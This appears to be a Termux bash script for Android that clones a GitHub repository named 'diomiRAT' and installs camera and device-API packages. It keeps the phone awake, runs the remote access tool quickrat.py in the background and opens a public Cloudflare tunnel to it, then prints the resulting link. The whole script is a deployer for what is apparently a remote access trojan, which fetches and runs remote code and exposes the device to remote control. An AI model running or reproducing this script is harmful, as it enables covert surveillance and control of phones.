#!/bin/bash
pkg update -y && pkg upgrade -y
pkg install -y python termux-api opencv-python cloudflared git
cd $HOME
[ -d diomiRAT ] && { cd diomiRAT; git pull; } || git clone https://github.com/Diomi1/diomiRAT.git && cd diomiRAT
chmod +x quickrat.py
pkill -f quickrat.py; pkill -f cloudflared
termux-wake-lock
nohup python quickrat.py &
nohup cloudflared tunnel --url http://localhost:5000 > t.log 2>&1 &
sleep 10; clear
echo "Listo – Enlace permanente:"
grep -o 'https://.*trycloudflare.com' t.log | tail -1